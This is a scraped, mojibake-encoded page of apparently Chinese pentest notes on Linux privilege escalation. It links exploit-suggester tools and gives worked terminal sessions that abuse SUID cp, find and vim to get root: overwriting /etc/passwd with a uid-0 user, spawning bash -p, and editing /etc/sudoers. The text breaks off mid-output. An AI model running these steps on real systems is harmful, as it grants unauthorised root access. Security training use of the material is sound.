router-link-exact-active nav-link sidebar-link heading" aria-label="Linuxææƒ"><!---->Linuxææƒ<!----></a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a aria-current="page" href="/IntranetSec/LinuxSec/Linux%E6%8F%90%E6%9D%83.html#å»ºè®®" class="router-link-active router-link-exact-active nav-link sidebar-link heading" aria-label="å»ºè®®"><!---->å»ºè®®<!----></a><ul class="sidebar-sub-headers"></ul></li><li class="sidebar-sub-header"><a aria-current="page" href="/IntranetSec/LinuxSec/Linux%E6%8F%90%E6%9D%83.html#æ¼æ´ææƒ" class="router-link-active router-link-exact-active nav-link sidebar-link heading" aria-label="æ¼æ´ææƒ"><!---->æ¼æ´ææƒ<!----></a><ul class="sidebar-sub-headers"></ul></li><li class="sidebar-sub-header"><a aria-current="page" href="/IntranetSec/LinuxSec/Linux%E6%8F%90%E6%9D%83.html#éæ¼æ´ææƒ" class="router-link-active router-link-exact-active nav-link sidebar-link heading" aria-label="éæ¼æ´ææƒ"><!---->éæ¼æ´ææƒ<!----></a><ul class="sidebar-sub-headers"></ul></li></ul></li></ul><!--]--></li><li><!--[--><a href="/IntranetSec/LinuxSec/LInux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94.html" class="nav-link sidebar-link sidebar-page" aria-label="Linuxåº”æ€¥å“åº”"><!---->Linuxåº”æ€¥å“åº”<!----></a><ul class="sidebar-sub-headers"></ul><!--]--></li></ul></section></li><li><section class="sidebar-group"><button class="sidebar-heading clickable" type="button"><span class="font-icon icon iconfont icon-windows" style=""></span><span class="title">Windowsç³»ç»Ÿå†…ç½‘å®‰å…¨</span><span class="arrow end"></span></button><!----></section></li></ul><!--[--><!----><!--]--></aside><!--[--><main class="page" id="main-content"><!--[--><!----><nav class="breadcrumb disable"></nav><div class="page-title"><h1><!---->Linuxææƒ</h1><div class="page-info"><span class="page-author-info" aria-label="ä½œè€…ğŸ–Š" data-balloon-pos="down"><svg xmlns="http://www.w3.org/2000/svg" class="icon author-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="author icon"><path d="M649.6 633.6c86.4-48 147.2-144 147.2-249.6 0-160-128-288-288-288s-288 128-288 288c0 108.8 57.6 201.6 147.2 249.6-121.6 48-214.4 153.6-240 288-3.2 9.6 0 19.2 6.4 25.6 3.2 9.6 12.8 12.8 22.4 12.8h704c9.6 0 19.2-3.2 25.6-12.8 6.4-6.4 9.6-16 6.4-25.6-25.6-134.4-121.6-240-243.2-288z"></path></svg><span><a class="page-author-item" href="https://hzyxy.github.io" target="_blank" rel="noopener noreferrer">XY</a></span><span property="author" content="XY"></span></span><!----><span class="page-date-info" aria-label="å†™ä½œæ—¥æœŸğŸ“…" data-balloon-pos="down"><svg xmlns="http://www.w3.org/2000/svg" class="icon calendar-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="calendar icon"><path d="M716.4 110.137c0-18.753-14.72-33.473-33.472-33.473-18.753 0-33.473 14.72-33.473 33.473v33.473h66.993v-33.473zm-334.87 0c0-18.753-14.72-33.473-33.473-33.473s-33.52 14.72-33.52 33.473v33.473h66.993v-33.473zm468.81 33.52H716.4v100.465c0 18.753-14.72 33.473-33.472 33.473a33.145 33.145 0 01-33.473-33.473V143.657H381.53v100.465c0 18.753-14.72 33.473-33.473 33.473a33.145 33.145 0 01-33.473-33.473V143.657H180.6A134.314 134.314 0 0046.66 277.595v535.756A134.314 134.314 0 00180.6 947.289h669.74a134.36 134.36 0 00133.94-133.938V277.595a134.314 134.314 0 00-133.94-133.938zm33.473 267.877H147.126a33.145 33.145 0 01-33.473-33.473c0-18.752 14.72-33.473 33.473-33.473h736.687c18.752 0 33.472 14.72 33.472 33.473a33.145 33.145 0 01-33.472 33.473z"></path></svg><span><!----></span><meta property="datePublished" content="2023-03-10T00:00:00.000Z"></span><!----><span class="page-reading-time-info" aria-label="é˜…è¯»æ—¶é—´âŒ›" data-balloon-pos="down"><svg xmlns="http://www.w3.org/2000/svg" class="icon timer-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="timer icon"><path d="M799.387 122.15c4.402-2.978 7.38-7.897 7.38-13.463v-1.165c0-8.933-7.38-16.312-16.312-16.312H256.33c-8.933 0-16.311 7.38-16.311 16.312v1.165c0 5.825 2.977 10.874 7.637 13.592 4.143 194.44 97.22 354.963 220.201 392.763-122.204 37.542-214.893 196.511-220.2 389.397-4.661 5.049-7.638 11.651-7.638 19.03v5.825h566.49v-5.825c0-7.379-2.849-13.981-7.509-18.9-5.049-193.016-97.867-351.985-220.2-389.527 123.24-37.67 216.446-198.453 220.588-392.892zM531.16 450.445v352.632c117.674 1.553 211.787 40.778 211.787 88.676H304.097c0-48.286 95.149-87.382 213.728-88.676V450.445c-93.077-3.107-167.901-81.297-167.901-177.093 0-8.803 6.99-15.793 15.793-15.793 8.803 0 15.794 6.99 15.794 15.793 0 80.261 63.69 145.635 142.01 145.635s142.011-65.374 142.011-145.635c0-8.803 6.99-15.793 15.794-15.793s15.793 6.99 15.793 15.793c0 95.019-73.789 172.82-165.96 177.093z"></path></svg><span>å¤§çº¦ 18 åˆ†é’Ÿ</span><meta property="timeRequired" content="PT18M"></span><span class="page-category-info" aria-label="åˆ†ç±»ğŸŒˆ" data-balloon-pos="down"><svg xmlns="http://www.w3.org/2000/svg" class="icon category-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="category icon"><path d="M148.41 106.992h282.176c22.263 0 40.31 18.048 40.31 40.31V429.48c0 22.263-18.047 40.31-40.31 40.31H148.41c-22.263 0-40.311-18.047-40.311-40.31V147.302c0-22.263 18.048-40.31 40.311-40.31zM147.556 553.478H429.73c22.263 0 40.311 18.048 40.311 40.31v282.176c0 22.263-18.048 40.312-40.31 40.312H147.555c-22.263 0-40.311-18.049-40.311-40.312V593.79c0-22.263 18.048-40.311 40.31-40.311zM593.927 106.992h282.176c22.263 0 40.31 18.048 40.31 40.31V429.48c0 22.263-18.047 40.31-40.31 40.31H593.927c-22.263 0-40.311-18.047-40.311-40.31V147.302c0-22.263 18.048-40.31 40.31-40.31zM730.22 920.502H623.926c-40.925 0-74.22-33.388-74.22-74.425V623.992c0-41.038 33.387-74.424 74.425-74.424h222.085c41.038 0 74.424 33.226 74.424 74.067v114.233c0 10.244-8.304 18.548-18.547 18.548s-18.548-8.304-18.548-18.548V623.635c0-20.388-16.746-36.974-37.33-36.974H624.13c-20.585 0-37.331 16.747-37.331 37.33v222.086c0 20.585 16.654 37.331 37.126 37.331H730.22c10.243 0 18.547 8.304 18.547 18.547 0 10.244-8.304 18.547-18.547 18.547z"></path></svg><span class="page-category-item category1 clickable" role="navigation">å†…ç½‘å®‰å…¨</span><meta property="articleSection" content="å†…ç½‘å®‰å…¨"></span><span class="page-tag-info" aria-label="æ ‡ç­¾ğŸ·" data-balloon-pos="down"><svg xmlns="http://www.w3.org/2000/svg" class="icon tag-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="tag icon"><path d="M939.902 458.563L910.17 144.567c-1.507-16.272-14.465-29.13-30.737-30.737L565.438 84.098h-.402c-3.215 0-5.726 1.005-7.634 2.913l-470.39 470.39a10.004 10.004 0 000 14.164l365.423 365.424c1.909 1.908 4.42 2.913 7.132 2.913s5.223-1.005 7.132-2.913l470.39-470.39c2.01-2.11 3.014-5.023 2.813-8.036zm-240.067-72.121c-35.458 0-64.286-28.828-64.286-64.286s28.828-64.285 64.286-64.285 64.286 28.828 64.286 64.285-28.829 64.286-64.286 64.286z"></path></svg><span class="page-tag-item tag3 clickable" role="navigation">Linuxç³»ç»Ÿå†…ç½‘å®‰å…¨</span><span class="page-tag-item tag2 clickable" role="navigation">ææƒ</span><meta property="keywords" content="Linuxç³»ç»Ÿå†…ç½‘å®‰å…¨,ææƒ"></span></div><hr></div><div class="toc-place-holder"><aside id="toc"><!--[--><!----><!--]--><div class="toc-header">æ­¤é¡µå†…å®¹<button type="button" class="print-button" title="æ‰“å°"><svg xmlns="http://www.w3.org/2000/svg" class="icon print-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="print icon"><path d="M819.2 364.8h-44.8V128c0-17.067-14.933-32-32-32H281.6c-17.067 0-32 14.933-32 32v236.8h-44.8C145.067 364.8 96 413.867 96 473.6v192c0 59.733 49.067 108.8 108.8 108.8h44.8V896c0 17.067 14.933 32 32 32h460.8c17.067 0 32-14.933 32-32V774.4h44.8c59.733 0 108.8-49.067 108.8-108.8v-192c0-59.733-49.067-108.8-108.8-108.8zM313.6 160h396.8v204.8H313.6V160zm396.8 704H313.6V620.8h396.8V864zM864 665.6c0 25.6-19.2 44.8-44.8 44.8h-44.8V588.8c0-17.067-14.933-32-32-32H281.6c-17.067 0-32 14.933-32 32v121.6h-44.8c-25.6 0-44.8-19.2-44.8-44.8v-192c0-25.6 19.2-44.8 44.8-44.8h614.4c25.6 0 44.8 19.2 44.8 44.8v192z"></path></svg></button></div><div class="toc-wrapper"><ul class="toc-list"><!--[--><li class="toc-item"><a aria-current="page" href="/IntranetSec/LinuxSec/Linux%E6%8F%90%E6%9D%83.html#linuxææƒ" class="router-link-active router-link-exact-active toc-link level2">Linuxææƒ</a></li><li><ul class="toc-list"><!--[--><li class="toc-item"><a aria-current="page" href="/IntranetSec/LinuxSec/Linux%E6%8F%90%E6%9D%83.html#å»ºè®®" class="router-link-active router-link-exact-active toc-link level3">å»ºè®®</a></li><!----><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/IntranetSec/LinuxSec/Linux%E6%8F%90%E6%9D%83.html#æ¼æ´ææƒ" class="router-link-active router-link-exact-active toc-link level3">æ¼æ´ææƒ</a></li><!----><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/IntranetSec/LinuxSec/Linux%E6%8F%90%E6%9D%83.html#éæ¼æ´ææƒ" class="router-link-active router-link-exact-active toc-link level3">éæ¼æ´ææƒ</a></li><!----><!--]--></ul></li><!--]--></ul></div><!--[--><!----><!--]--></aside></div><!----><div class="theme-hope-content"><h2 id="linuxææƒ" tabindex="-1"><a class="header-anchor" href="#linuxææƒ" aria-hidden="true">#</a> Linuxææƒ</h2><h3 id="å»ºè®®" tabindex="-1"><a class="header-anchor" href="#å»ºè®®" aria-hidden="true">#</a> å»ºè®®</h3><p>å…ˆæ‰¾éæ¼æ´ææƒï¼Œå› ä¸ºæ¼æ´ææƒå¯èƒ½ä¼šå°†æœåŠ¡å™¨å¼„è“å±ç­‰æ•…éšœï¼Œä¼šéå¸¸éº»çƒ¦ã€‚</p><h3 id="æ¼æ´ææƒ" tabindex="-1"><a class="header-anchor" href="#æ¼æ´ææƒ" aria-hidden="true">#</a> æ¼æ´ææƒ</h3><h4 id="linuxæ¼æ´ææƒæ£€æµ‹è„šæœ¬" tabindex="-1"><a class="header-anchor" href="#linuxæ¼æ´ææƒæ£€æµ‹è„šæœ¬" aria-hidden="true">#</a> Linuxæ¼æ´ææƒæ£€æµ‹è„šæœ¬</h4><ul><li>è·å–å†…æ ¸ç‰ˆæœ¬åï¼Œå¯ä»¥æœç´¢è¯¥ç‰ˆæœ¬å­˜åœ¨å“ªäº›æ¼æ´å¯ä»¥ç”¨æ¥è¿›è¡Œææƒ</li><li>ä¾‹å¦‚å¸¸ç”¨çš„æ£€æµ‹è„šæœ¬ï¼š</li></ul><p>linux-exploit-suggester-2ï¼š<a href="https://github.com/jondonas/linux-exploit-suggester-2" target="_blank" rel="noopener noreferrer">https://github.com/jondonas/linux-exploit-suggester-2<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><p>linux-kernel-exploitsï¼š<a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener noreferrer">https://github.com/SecWiki/linux-kernel-exploits<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><p>ä½†åœ¨ä¸€äº›æœ€æ–°ææƒæ¼æ´ä¸Šï¼Œæ›´æ–°å¯èƒ½å¹¶ä¸æ˜¯å¾ˆå¿«ï¼Œä¾‹å¦‚CVE2020ç­‰ææƒæ¼æ´ã€‚å¦‚æœç¢°åˆ°ç›®æ ‡æœºå†…æ ¸æ¯”è¾ƒæ–°ï¼Œå¯èƒ½å°±éœ€è¦è‡ªå·±å»æ‰‹åŠ¨æœç´¢ç›¸å…³é—®é¢˜ï¼Œè°·æ­Œç›¸å…³çš„å…³é”®å­—ï¼Œæˆ–è€…æ‰¾ä¸€äº›åœ¨çº¿ç½‘ç«™æœç´¢ï¼Œä¾‹å¦‚ï¼š</p><p><a href="https://cxsecurity.com/" target="_blank" rel="noopener noreferrer">https://cxsecurity.com/<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><h3 id="éæ¼æ´ææƒ" tabindex="-1"><a class="header-anchor" href="#éæ¼æ´ææƒ" aria-hidden="true">#</a> éæ¼æ´ææƒ</h3><h4 id="linuxéæ¼æ´ææƒæ£€æµ‹è„šæœ¬" tabindex="-1"><a class="header-anchor" href="#linuxéæ¼æ´ææƒæ£€æµ‹è„šæœ¬" aria-hidden="true">#</a> Linuxéæ¼æ´ææƒæ£€æµ‹è„šæœ¬</h4><ul><li>é’ˆå¯¹éæ¼æ´çš„ç›¸å…³ææƒæ–¹æ³•ï¼Œä»¥åŠæœé›†Linuxä¸Šç›¸å…³çš„æ•æ„Ÿä¿¡æ¯ï¼Œè¿™é‡Œå¯ä»¥å‚è€ƒä¸€äº›è„šæœ¬ï¼Œä¾‹å¦‚ï¼š</li></ul><p>LinuEnumï¼š<a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener noreferrer">https://github.com/rebootuser/LinEnum<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><p>BeRootï¼š<a href="https://github.com/AlessandroZ/BeRoot" target="_blank" rel="noopener noreferrer">https://github.com/AlessandroZ/BeRoot<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><p>Linux-smart-enumerationï¼š<a href="https://github.com/diego-treitos/linux-smart-enumeration" target="_blank" rel="noopener noreferrer">https://github.com/diego-treitos/linux-smart-enumeration<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><h4 id="suidææƒ" tabindex="-1"><a class="header-anchor" href="#suidææƒ" aria-hidden="true">#</a> SUIDææƒ</h4><ol><li>SUIDåªèƒ½è®¾ç½®äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</li><li>å‘½ä»¤æ‰§è¡Œè€…è¦æœ‰äºŒè¿›åˆ¶æ–‡ä»¶çš„æ‰§è¡Œæƒã€‚</li><li>å‘½ä»¤æ‰§è¡Œè€…æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶æ—¶ä¼šè·å¾—è¯¥ç¨‹åºçš„å±ä¸»èº«ä»½ã€‚</li><li>SUIDæƒé™åªåœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­æœ‰æ•ˆã€‚</li></ol><ul><li><p>å³å¦‚æœrootç»™ä¸€ä¸ªç¨‹åºèµ‹äºˆäº†SUIDæƒé™ï¼Œåˆ™æ™®é€šç”¨æˆ·åœ¨æ‰§è¡Œè¯¥ç¨‹åºè¿‡ç¨‹ä¸­ï¼Œæ˜¯rootæƒé™ã€‚</p></li><li><p>æ‹¥æœ‰SUIDæƒé™çš„ç¨‹åºä¸­æƒé™ä¸­æœ‰sã€‚</p></li></ul><p>å¯é€šè¿‡<code>find / -perm -u=s -type f 2&gt;/dev/null</code>å‘½ä»¤æŸ¥æ‰¾æ‹¥æœ‰SUIDæƒé™çš„ç¨‹åº</p><p>permæ‰§è¡Œæƒé™ï¼Œ-u=sä»£è¡¨SUIDæƒé™ï¼ŒtypeæŒ‡å®šæ–‡ä»¶ç±»å‹ï¼Œfè¡¨ç¤ºå¸¸è§„æ–‡ä»¶ã€‚</p><h5 id="cp" tabindex="-1"><a class="header-anchor" href="#cp" aria-hidden="true">#</a> cp</h5><ul><li>cpå‘½ä»¤è¢«èµ‹äºˆäº†SUIDæƒé™åå°±å­˜åœ¨ææƒçš„å¯èƒ½</li><li>æ™®é€šç”¨æˆ·é€šè¿‡å¤åˆ¶/etc/passwdæ–‡ä»¶ï¼Œå†™å…¥ä¸€ä¸ªrootæƒé™ç”¨æˆ·æœ€åè¦†ç›–/etc/passwdæ–‡ä»¶å®ç°ææƒã€‚</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>èƒŒæ™¯ï¼š
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># which cp</span>
/usr/bin/cp
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># chmod +s /usr/bin/cp</span>
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># ls -al /usr/bin/cp</span>
-rwsr-sr-x. <span class="token number">1</span> root root <span class="token number">155176</span> <span class="token number">8</span>æœˆ  <span class="token number">20</span> <span class="token number">2019</span> /usr/bin/cp


ææƒè¿‡ç¨‹ï¼š
<span class="token number">1</span>.åˆ©ç”¨cpçš„suidåŠŸèƒ½å°†/etc/passwdæ–‡ä»¶å¤åˆ¶ä¸€ä»½
<span class="token punctuation">[</span>hzy@localhost ~<span class="token punctuation">]</span>$ <span class="token function">cp</span> /etc/passwd ./

<span class="token number">2</span>.ä½¿ç”¨opensllç”Ÿæˆç”¨æˆ·å¯†ç ä¸º123456ï¼Œç”¨æˆ·åè‡ªå·±éšæ„å®š
<span class="token punctuation">[</span>hzy@localhost ~<span class="token punctuation">]</span>$ openssl <span class="token function">passwd</span> <span class="token parameter variable">-1</span> <span class="token parameter variable">-salt</span> yanzhi <span class="token number">123456</span>
<span class="token variable">$1</span><span class="token variable">$yanzhi</span><span class="token variable">$Xir02oBlx9g2APCmUZkJa</span>/

<span class="token number">3</span>.ä»¿ç…§/etc/passwdæ–‡ä»¶rooté‚£ä¸€è¡Œå†™å…¥ä¸€ä¸ªæ–°ç”¨æˆ·ï¼Œå¹¶wq<span class="token operator">!</span>ã€‚
<span class="token punctuation">[</span>hzy@localhost ~<span class="token punctuation">]</span>$ <span class="token function">vim</span> <span class="token function">passwd</span>

newuser:<span class="token variable">$1</span><span class="token variable">$yanzhi</span><span class="token variable">$Xir02oBlx9g2APCmUZkJa</span>/:0:0:root:/root:/bin/bash
<span class="token number">4</span>.è¦†ç›–æ‰/etc/passwdæ–‡ä»¶
<span class="token punctuation">[</span>hzy@localhost ~<span class="token punctuation">]</span>$ <span class="token function">cp</span> ./passwd /etc/passwd

<span class="token number">5</span>.åˆ‡æ¢newuserï¼Œå®ç°ææƒã€‚
<span class="token punctuation">[</span>hzy@localhost ~<span class="token punctuation">]</span>$ <span class="token function">su</span> newuser
å¯†ç ï¼š
<span class="token punctuation">[</span>root@localhost hzy<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="find" tabindex="-1"><a class="header-anchor" href="#find" aria-hidden="true">#</a> find</h5><ul><li>findå‘½ä»¤è¢«èµ‹äºˆäº†SUIDæƒé™åå°±å­˜åœ¨ææƒçš„å¯èƒ½</li><li>ç”±äºfindå‘½ä»¤åé¢å¯ä»¥ä½¿ç”¨-execå‘½ä»¤æ¥æ‰§è¡Œå…¶ä»–ä»»æ„å‘½ä»¤ï¼Œæ‰€ä»¥å¯ä»¥å®ç°ææƒã€‚</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>èƒŒæ™¯ï¼š
<span class="token punctuation">[</span>root@localhost hzy<span class="token punctuation">]</span><span class="token comment"># which find</span>
/usr/bin/find
<span class="token punctuation">[</span>root@localhost hzy<span class="token punctuation">]</span><span class="token comment"># chmod +s /usr/bin/find</span>
<span class="token punctuation">[</span>root@localhost hzy<span class="token punctuation">]</span><span class="token comment"># ls -al /usr/bin/find</span>
-rwsr-sr-x. <span class="token number">1</span> root root <span class="token number">199304</span> <span class="token number">10</span>æœˆ <span class="token number">31</span> <span class="token number">2018</span> /usr/bin/find

ææƒè¿‡ç¨‹ï¼š
<span class="token number">1</span>.ç®€å•æµ‹è¯•
<span class="token punctuation">[</span>hzy@localhost ~<span class="token punctuation">]</span>$ <span class="token function">touch</span> <span class="token number">123</span>.txt
<span class="token punctuation">[</span>hzy@localhost ~<span class="token punctuation">]</span>$ <span class="token function">find</span> <span class="token number">123</span>.txt <span class="token parameter variable">-exec</span> <span class="token string">&quot;whoami&quot;</span> <span class="token punctuation">\</span><span class="token punctuation">;</span>
root
<span class="token number">2</span>.åˆ©ç”¨findè°ƒå‡ºä¸€ä¸ªbash
<span class="token punctuation">[</span>hzy@localhost ~<span class="token punctuation">]</span>$ <span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-exec</span> /bin/bash <span class="token parameter variable">-p</span> <span class="token punctuation">\</span><span class="token punctuation">;</span>
bash-4.2<span class="token comment"># whoami</span>
root
æˆ–ï¼š
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># find . -exec /bin/sh -p \;</span>
sh-4.2<span class="token comment"># whoami</span>
root
sh-4.2<span class="token comment"># python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; #å‡çº§æˆäº¤äº’å¼shell</span>
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="vim" tabindex="-1"><a class="header-anchor" href="#vim" aria-hidden="true">#</a> vim</h5><ul><li>vimå‘½ä»¤è¢«èµ‹äºˆäº†SUIDæƒé™åå°±å­˜åœ¨ææƒçš„å¯èƒ½</li><li>å½“vimè¢«èµ‹äºˆäº†SUIDæƒé™åï¼Œä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥ç¼–è¾‘å“ªäº›åªèƒ½ç”±rootç¼–è¾‘çš„æ–‡ä»¶äº†ã€‚ <ul><li>1.å¯ä»¥é€šè¿‡/etc/sudoersè¿™ä¸ªæ–‡ä»¶ï¼Œæ§åˆ¶ç”¨æˆ·å¯ä»¥é€šè¿‡sudoå‘½ä»¤ä»¥rootæƒé™æ‰§è¡Œå“ªäº›å‘½ä»¤ã€‚</li><li>2.ä¹Ÿå¯ä»¥ä¿®æ”¹/etc/passwdæ–‡ä»¶ï¼Œå†™å…¥ä¸€ä¸ªrootæƒé™çš„ç”¨æˆ·ã€‚</li></ul></li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>èƒŒæ™¯ï¼š
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># which vim</span>
/usr/bin/vim
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># ls -al /usr/bin/vim</span>
-rwxr-xr-x. <span class="token number">1</span> root root <span class="token number">2337216</span> <span class="token number">10</span>æœˆ <span class="token number">14</span> <span class="token number">2020</span> /usr/bin/vim
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># chmod +s /usr/bin/vim</span>
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># ls -al /usr/bin/vim</span>
-rwsr-sr-x. <span class="token number">1</span> root root <span class="token number">2337216</span> <span class="token number">10</span>æœˆ <span class="token number">14</span> <span class="token number">2020</span> /usr/bin/vim

ææƒè¿‡ç¨‹ï¼š
<span class="token punctuation">[</span>test@localhost root<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> <span class="token builtin class-name">test</span> çš„å¯†ç ï¼š
å¯¹ä¸èµ·ï¼Œç”¨æˆ· <span class="token builtin class-name">test</span> ä¸èƒ½åœ¨ localhost ä¸Šè¿è¡Œ sudoã€‚

<span class="token number">1</span>.åœ¨/etc/sudoersæ–‡ä»¶ä¸­å†™å…¥test <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> ALLï¼Œç„¶åwq<span class="token operator">!</span>ä¿å­˜ã€‚
<span class="token punctuation">[</span>test@localhost root<span class="token punctuation">]</span>$ <span class="token function">vim</span> /etc/sudoers
<span class="token punctuation">[</span>test@localhost root<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> <span class="token builtin class-name">test</span> çš„å¯†ç ï¼š
åŒ¹é… %2<span class="token variable">$s</span> ä¸Š %1<span class="token variable">$s</span> çš„é»˜è®¤æ¡ç›®ï¼š
    <span class="token operator">!</span>visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, <span class="token assign-left variable">env_keep</span><span class="token operator">=</span><span class="token string">&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;</span>,
